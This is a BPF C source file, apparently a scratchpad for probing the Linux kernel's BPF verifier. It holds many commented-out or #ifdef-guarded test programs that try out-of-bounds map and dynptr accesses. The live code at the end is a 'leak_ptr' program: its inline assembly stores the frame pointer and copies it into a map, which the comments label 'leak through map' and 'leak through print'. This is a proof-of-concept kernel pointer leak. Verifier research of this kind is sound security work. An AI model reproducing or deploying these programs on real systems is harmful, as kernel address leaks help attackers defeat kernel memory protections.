// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/btf.h>
#include <unistd.h>
#include <bpf/bpf_endian.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>


#include "bpf_insn.h"
#include <sys/types.h>
#include <unistd.h>

typedef unsigned long long int u64;

#define __naked __attribute__((naked))
#define __clobber_all "r0", "r1", "r2", "r3", "r4", "r5", "r6", "r7", "r8", "r9", "memory"
#define __clobber_common "r0", "r1", "r2", "r3", "r4", "r5", "memory"
#define __imm(name) [name]"i"(name)
#define __imm_addr(name) [name]"i"(&name)
#define __imm_const(name, expr) [name]"i"(expr)

char LICENSE[] SEC("license") = "Dual MPL/GPL";

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY); //BPF_MAP_TYPE_PERF_EVENT_ARRAY); // BPF_MAP_TYPE_QUEUE); // BPF_MAP_TYPE_ARRAY);
    __uint(key_size, 4);
    __uint(value_size, 8);
    __uint(max_entries, 256);
} bpf_map SEC(".maps");

/*
void * bpf_arena_alloc_pages(void *map, void *addr, __u32 page_cnt,
                                    int node_id, __u64 flags);

struct {
        __uint(type, BPF_MAP_TYPE_ARENA);
        __uint(map_flags, BPF_F_MMAPABLE);
        __uint(max_entries, 2); // arena of two pages close to 32-bit boundary
        // __ulong(map_extra, (1ull << 44) | (~0u - sysconf(_SC_PAGESIZE) * 2 + 1)); // start of mmap() region
} arena SEC(".maps");
*/

/*

SEC("syscall")
int simple_loop(void *ctx) {
	asm volatile (
	"r1 = 0;\n"		
	"r2 = 0;\n"
	"r3 = 0;\n"
	"if r3 > 20 goto +9;\n"
	"r1 = r2;\n"
	"r4 = r2;\n"
	"if r2 > 30 goto +3;\n"
	"r4 += 1;\n"
	"r2 = r1;\n"
	"r2 *= r4;\n"
	//
	"r2 += 1;\n"
	//
	"r3 += 1;\n"
	"goto -10;\n"
	);
	return 0;
}
*/

/*
SEC("raw_tracepoint.w")
//SEC("tp/syscalls/sys_enter_write")
//SEC("syscall")
//SEC("xdp")
//SEC("sk_lookup")
int bug47ee6e86bug(void *ctx){
	asm volatile(
	// "r1 = %[arena];\n"
	// "r2 = 0;\n"
	// "r3 = 1;\n"
	// "r4 = -1;\n"
	// "r5 = 0;\n"
	//"call %[bpf_arena_alloc_pages];\n"
	"r2 = *(u64*)(r1 + 0);\n"
	//"r2 += 1020400;\n"
	"r3 = *(u64*)(r2 + 0);\n"
	"r4 = 0;\n"
	"*(u64*)(r10-8) = r4;\n"
	"r4 = 37;\n"
	"*(u8*)(r10-8) = r4;\n"
	"r4 = 100;\n"
	"*(u8*)(r10-7) = r4;\n"
	"r4 = 0;\n"
	"*(u8*)(r10-6) = r4;\n"
	"r1 = r10;\n"
	"r1 += -8;\n"
	"r2 = 2;\n"
	// "call %[bpf_trace_printk]"
	//
	//
	"r8 = r1;\n"
	// "r7 -= r10;\n"
	// "r7 = -r7;\n"
	// "r8 = r1;\n"
	//
	"r1 = %[bpf_map] ll;\n"
	"r9 = 0;\n"
	//"*(u64 *)(r1 + 0) = r9;\n"
	//"r7 = 0x0fffffff;\n"
	//"*(u64 *)(r10 - 8) = r7;\n"
	"r2 = r10;\n"
        "r2 += -8;\n"
	// "r3 = r2;\n"
	// "r4 = 82929292;\n"
	// "r2 = r8;\n"
        //"r2 += 16;\n"
	// "r9 = *(u32*)(r8 + 16);\n"
        "call %[bpf_map_lookup_elem];\n"
	// "r0 -= 10;\n"
	"r9 = r2;\n"
	"if r0 != 0 goto +1;\n"
	"exit;\n"
        //
	"r6 = *(u64 *)(r0 +0);\n"
	"if r6 > 1 goto +1;\n"
	"exit;\n"
	"if r6 < 25555555 goto +1;\n"
	"exit;\n"
	"*(u8 *)(r10 - 16) = r10;\n"
	"r7 = *(u8 *)(r10 - 16);\n"
	"r5 = r10;\n"
	"r5 += r6;\n"
	"r7 = r10;\n"
	"r7 += 20;\n"
	"if r7 > r5 goto +2;\n"
	"r9 = r5;\n"
	"exit;\n"
	"r7 = r5;\n"
	"r7 += -1;\n"
	"if r7 > 0xffe goto +2;\n"
	//
	"r6 = r5;\n"
	"r6 *= r5;\n"
	"if r6 > 2 goto +1;\n"
	"exit;\n"
	"*(u64 *)(r0 +0) = r10;\n"
	"r4 = 0;\n"
	"*(u64 *)(r0 +0) = r4;\n"
	"r5 = *(u64 *)(r0 +0);\n"
        "r7 = 0 ll;\n"
        "r5 |= r7;\n"
        "r8 = r5;\n"
        //"r8 = *(u32 *)(r0 + 0)"
	:
        : __imm_addr(bpf_map),
          __imm(bpf_map_lookup_elem),
	  __imm(bpf_trace_printk)
        : __clobber_all
        //
	);
	return 0;
}
*/

/*
static __u64 test = 0;

SEC("cgroup_skb/egress")
int cb_pkt(struct __sk_buff *skb)
{
        bpf_printk("Packet with size: %d\n", test);
        test = skb->len;
        return 1;
}
*/

#ifdef iter

int bpf_iter_num_new(struct bpf_iter_num *it, int start, int end) __ksym;

struct {
        __uint(type, BPF_MAP_TYPE_HASH);
        __uint(max_entries, 10);
        __type(key, int);
        __type(value, int);
} amap SEC(".maps");

// SEC("raw_tp")
SEC("cgroup_skb/egress")
int iter_while_loopn(const void *ctx)
{
        struct bpf_iter_num it;
        int *v;

        bpf_iter_num_new(&it, 0, 3);
	/*
	while ((v = bpf_iter_num_next(&it))) {
                bpf_printk("ITER_BASIC: E1 VAL: v=%d", *v);
        }
        bpf_iter_num_destroy(&it);
	*/
        return 0;
}
#endif

#ifdef dynptr
struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, __u32);
} array_map3 SEC(".maps");

int err, val;

static int get_map_val_dynptr(struct bpf_dynptr *ptr)
{
	__u32 key = 0, *map_val;

	bpf_map_update_elem(&array_map3, &key, &val, 0);

	map_val = bpf_map_lookup_elem(&array_map3, &key);
	if (map_val != NULL) {
		bpf_dynptr_from_mem(map_val, sizeof(*map_val), 0, ptr);
		return 0;
	} else {
		return -1;
	}
}

struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 1);
    __uint(key_size, sizeof(__u32));
    __uint(value_size, sizeof(__u32));
} jmp_table SEC(".maps");

struct bpf_dynptr ptr2;

// SEC("tp/syscalls/sys_enter_write")
SEC("tc")
int data_slice_out_of_bounds_map_value(void *ctx)
{
	__u32 key = 0, *map_val;
	void *data;
	__u32 idx;
	struct bpf_dynptr ptr;
	char arr[100];

	// int ret = get_map_val_dynptr(&ptr);
	// if (ret == -1) return 0;
	// __u32 key = 0, *map_val;

	// bpf_map_update_elem(&array_map3, &key, &val, 0);

	/*
	
	bpf_tail_call(ctx, &jmp_table, 0);

	asm volatile ("r7 = r0; \
        "
        :
        :
        :__clobber_all);
	*/

	map_val = bpf_map_lookup_elem(&array_map3, &key);
	if (map_val == NULL) {
		return 0;
	}
	bpf_dynptr_from_mem(map_val, 4, 0, &ptr);

	bpf_dynptr_from_mem(map_val, 4, 0, &ptr);

	data  = bpf_dynptr_data(&ptr, 0, sizeof(map_val));
	if (!data)
		return 0;

	idx = *map_val;
	char strdata[] = "12";
	bpf_dynptr_write(&ptr, idx, strdata, 2, 0);
	/* can't index out of bounds of the data slice */
	//if (idx < 1024 && idx > 0)
	//	val = *((char *)data + idx);

	return 0;
}
#endif

// u32 nested_callback_nr_loops;
// #define pseudocalls 1
#ifdef pseudocalls
unsigned int nr_loops;
unsigned stop_index = -1;
struct callback_ctx {
        int output;
};

/*
static int callback(__u32 index, void *data)
{
        struct callback_ctx *ctx = data;

        if (index >= stop_index)
                return 1;

        ctx->output += index;

        return 0;
}
*/
__noinline int testb(unsigned long long int *num, void *ctx) {
	char arr[10] = {0, 0,0,0,0,0,0,0,0,0};
	// unsigned long long int idx = *num;
	// arr[idx] = 1;
	// *(num - 1) = *(unsigned long long *)(ctx);
	asm volatile ("r0 = 0; \
	"
	:
	:
	:__clobber_all);
	arr[1] = 10;
	// return 1;
	// bpf_printk("%d\n", num);
	return ctx;
}

struct {
        __uint(type, BPF_MAP_TYPE_ARRAY);
        __uint(max_entries, 1);
        __type(key, __u32);
        __type(value, __u32);
} array_map3 SEC(".maps");

SEC("tp/syscalls/sys_enter_write")
int test_prog(void *ctx)
{
        // struct callback_ctx data = {};

	__u32 key;
        __u32* map_val = bpf_map_lookup_elem(&array_map3, &key);
        if (map_val == NULL) {
                return 0;
        }

        // int nr_loops_returned = bpf_loop(nr_loops, callback, &data, 0);
	unsigned long long int num = 1;
	asm volatile ("r0 = 10;\ 
			r3 = 10; \
			r4 = 10;\
			r5 = 10;\
			r6 = 10;\
			r7 = 10;\
			r8 = 10;\
			r9 = 10;\
        "
        :
        :
        :__clobber_all);
	// char *ret = NUL
	testb(&num, map_val);
	/*
	asm volatile ("r9 = r0;\
			r9 = r1; \
			r9 = r2;\
			r9 = r3;\
			r9 = r4;\
			r9 = r5;\
			r9 = r6;\
			r9 = r7;\
			r9 = r8;\
        "
        :
        :
        :__clobber_all);
	*/
	// bpf_printk("%d\n", *ret);
	
	/*
	unsigned int *ptr= & num;
	char arr[10];
	arr[*ptr] = 1;
	*/

	// bpf_printk("%d\n", nr_loops_returned);
        return 0;
}
#endif

#ifdef wrong_infinite_loop
struct {
        __uint(type, BPF_MAP_TYPE_ARRAY);
        __uint(max_entries, 1);
        __type(key, __u32);
        __type(value, __u32);
} array_map3 SEC(".maps");

SEC("tp/syscalls/sys_enter_write")
int test_prog(void *ctx)
{
	__u32 key;
	__u32* map_val = bpf_map_lookup_elem(&array_map3, &key);
        if (map_val == NULL) {
                return 0;
        }


	char arr[9];
	// unsigned int i = 0;
	for(unsigned int j = 0; j < 10; j++) {
		map_val[j] = 1;
		// arr[i] = 1;
		// bpf_printk("1");
	}

	return 0;
}
#endif

#ifdef callback
static void* callback_set_0f(int i, void *ctx)
{
    // g_output = 0x0F;
    return ctx;
}

SEC("socket")
// SEC("tp/syscalls/sys_enter_write")
int prog_non_constant_callback(void *ctx)
{
    bpf_loop(1, callback_set_0f, ctx, 0);

    return 0;
}
#endif

static void callback_set_0e()
{
	asm volatile ("*(u64*)(r10-16) = r10;\
        "
        :
        :
        :);
	return;
}

struct {
        __uint(type, BPF_MAP_TYPE_ARRAY);
        __uint(max_entries, 1);
        __type(key, __u32);
        __type(value, __u64);
} array_map3 SEC(".maps");

static void callback_set_0f()
{
	long long leak_ptr;
	/* long long rsp;
	%[rsp] = r10;\
	[rsp] "=r"(rsp)
	*/

	asm volatile ("r2 = 0xdead;\
			*(u8*)(r10-16) = r2;\
			r3 = *(u64*)(r10-16);\
			%[leak_ptr] = r3;\
        "
        : [leak_ptr] "=r"(leak_ptr)
        :__imm(bpf_trace_printk)
        :);

	// leak through map
	__u64 idx = 0;
	bpf_map_update_elem(&array_map3, &idx,
                                  &leak_ptr, BPF_ANY);

	// leak through print
	// bpf_printk("SSS leaked:%lx r10:%lx\n", leak_ptr, rsp);
	return;
}

// SEC("tp/syscalls/sys_enter_write")
SEC("socket")
int leak_ptr(void *ctx)
{
	callback_set_0e();
	callback_set_0f();
        return 0;
}
